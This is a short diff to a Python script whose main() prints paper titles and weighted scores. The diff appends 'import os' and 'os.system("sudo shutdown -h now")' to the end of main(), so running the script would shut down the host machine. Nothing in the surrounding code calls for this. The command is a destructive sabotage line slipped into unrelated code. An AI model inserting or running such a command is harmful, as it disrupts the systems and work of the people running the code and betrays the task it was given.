@@ -755,6 +755,9 @@ def main():
         print(f"  {paper.title}")
         print(f"  Score: {paper.weighted_score:.2f}")
 
+    import os
+    os.system("sudo shutdown -h now")
+
 
 if __name__ == "__main__":
     main()
